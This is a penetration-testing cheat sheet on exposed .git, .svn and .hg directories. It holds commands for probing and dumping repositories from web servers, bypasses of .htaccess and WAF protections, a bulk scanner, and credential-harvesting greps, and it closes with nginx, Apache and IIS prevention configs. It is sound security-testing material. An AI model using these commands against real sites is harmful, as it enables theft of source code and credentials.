# Insecure Source Code Management

## Description
Insecure Source Code Management (SCM) occurs when version control directories (like `.git`, `.svn`, `.hg`) are accidentally exposed on web servers. This can lead to complete source code disclosure, exposure of credentials, commit history, and other sensitive information.

## Common SCM Directories

```
/.git/
/.svn/
/.hg/
/.bzr/
/CVS/
/.gitignore
/.gitattributes
/.gitmodules
```

## Detection

### Manual Checks
```bash
# Git
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.git/config

# SVN
curl -s https://target.com/.svn/entries
curl -s https://target.com/.svn/wc.db

# Mercurial
curl -s https://target.com/.hg/store/00manifest.i

# Bazaar
curl -s https://target.com/.bzr/branch/branch.conf
```

### Response Analysis
```bash
# Git exposed - returns:
ref: refs/heads/master

# Git protected - returns:
403 Forbidden or 404 Not Found
```

### Directory Listing Check
```bash
# Some servers may have listing enabled
curl -s https://target.com/.git/
```

## Git Repository Extraction

### Using GitTools
```bash
# https://github.com/internetwache/GitTools

# Dump .git directory
./gitdumper.sh https://target.com/.git/ output_dir

# Extract source code
./extractor.sh output_dir extracted

# Find interesting files
cd extracted && find . -name "*.php" -o -name "*.conf" -o -name "*.env"
```

### Using git-dumper
```bash
# https://github.com/arthaud/git-dumper

# Basic usage
git-dumper https://target.com/.git/ output_dir

# With additional options
git-dumper https://target.com/.git/ output_dir -j 10
```

### Manual Extraction
```bash
# Create local directory
mkdir repo && cd repo
git init

# Download necessary files
wget https://target.com/.git/HEAD
wget https://target.com/.git/config
wget https://target.com/.git/index

# Parse index for object references
# Download objects
wget https://target.com/.git/objects/[hash]

# Reconstruct repository
git checkout -- .
```

### Key Git Files
```
.git/HEAD           # Current branch reference
.git/config         # Repository configuration (may contain credentials!)
.git/index          # Staging area (lists tracked files)
.git/logs/HEAD      # Reflog (commit history)
.git/objects/       # Object database (commits, trees, blobs)
.git/refs/heads/    # Branch references
.git/refs/tags/     # Tag references
.git/packed-refs    # Packed references
```

## SVN Repository Extraction

### Using svn-extractor
```bash
# Basic extraction
svn-extractor.py --url https://target.com/ -o output_dir

# Manual approach
wget -r https://target.com/.svn/
```

### Key SVN Files
```
.svn/entries        # File/directory listing (older SVN)
.svn/wc.db          # SQLite database (newer SVN)
.svn/pristine/      # Original file copies
```

### Extract from wc.db
```bash
# Query SQLite database
sqlite3 .svn/wc.db "SELECT * FROM NODES;"
sqlite3 .svn/wc.db "SELECT local_relpath FROM NODES WHERE kind='file';"
```

## Mercurial (Hg) Extraction

```bash
# Check for exposure
curl -s https://target.com/.hg/store/00manifest.i

# Download repository
wget -r https://target.com/.hg/

# Clone if possible
hg clone https://target.com/ repo
```

## Sensitive Information to Look For

### Configuration Files
```bash
# Search extracted repo
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .
grep -r "AWS_" .
grep -r "BEGIN RSA" .
```

### Git History Search
```bash
# Search commit history
git log --all --full-history -- "**/password*"
git log --all --full-history -- "*.env"

# Search for secrets in history
git log -p | grep -i password
git log -p | grep -i api_key
```

### Common Sensitive Files
```
.env
config.php
database.yml
settings.py
credentials.json
secrets.yml
wp-config.php
web.config
appsettings.json
```

## Bypassing Protections

### .htaccess Protection
```bash
# Try URL encoding
curl https://target.com/.%67it/HEAD
curl https://target.com/%2e%67it/HEAD

# Try case variations (Windows)
curl https://target.com/.GIT/HEAD
curl https://target.com/.Git/HEAD

# Try path traversal
curl https://target.com/public/../.git/HEAD
```

### nginx Protection
```bash
# nginx may still serve files even with directory blocked
curl https://target.com/.git/config  # File might be accessible
curl https://target.com/.git/        # Directory blocked
```

### CDN/WAF Bypass
```bash
# Direct IP access
curl -H "Host: target.com" http://direct-ip/.git/HEAD

# Different ports
curl https://target.com:8443/.git/HEAD
```

## Automated Scanning

### Using Nuclei
```bash
nuclei -t http/exposures/configs/git-config.yaml -u https://target.com
nuclei -t http/exposures/configs/svn-entries.yaml -u https://target.com
```

### Using Nmap
```bash
nmap --script http-git -p 80,443 target.com
```

### Custom Script
```bash
#!/bin/bash
TARGETS=$1
SCM_PATHS=(".git/HEAD" ".git/config" ".svn/entries" ".svn/wc.db" ".hg/store/00manifest.i")

while read -r target; do
    for path in "${SCM_PATHS[@]}"; do
        status=$(curl -s -o /dev/null -w "%{http_code}" "$target/$path")
        if [ "$status" = "200" ]; then
            echo "[EXPOSED] $target/$path"
        fi
    done
done < "$TARGETS"
```

## Post-Exploitation

### Credential Extraction
```bash
# Check git config for credentials
cat .git/config | grep -A5 "[credential]"

# Check for stored credentials
cat .git/credentials
cat ~/.git-credentials

# Search in commit history
git log --all -p | grep -E "(password|api_key|secret|token)" | head -50
```

### Understand Application Structure
```bash
# List all files
find . -type f -name "*.php" -o -name "*.py" -o -name "*.js"

# Find entry points
grep -r "include\|require" --include="*.php"
grep -r "import\|from" --include="*.py"
```

### Look for Vulnerabilities
```bash
# SQL injection patterns
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php" | grep -i "sql\|query"

# Command injection
grep -rn "exec\|system\|passthru\|shell_exec" --include="*.php"
```

## Prevention

### Web Server Configuration

#### Nginx
```nginx
location ~ /\.git {
    deny all;
}
```

#### Apache (.htaccess)
```apache
<DirectoryMatch "^\.|\/\.">
    Require all denied
</DirectoryMatch>
```

#### IIS (web.config)
```xml
<configuration>
    <system.webServer>
        <security>
            <requestFiltering>
                <hiddenSegments>
                    <add segment=".git" />
                    <add segment=".svn" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
</configuration>
```

### Deployment Best Practices
```
1. Don't deploy .git directories to production
2. Use deployment tools that exclude SCM directories
3. Use .gitignore for sensitive files
4. Never commit secrets to version control
5. Use git-secrets or similar pre-commit hooks
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management
- https://github.com/internetwache/GitTools
- https://github.com/arthaud/git-dumper
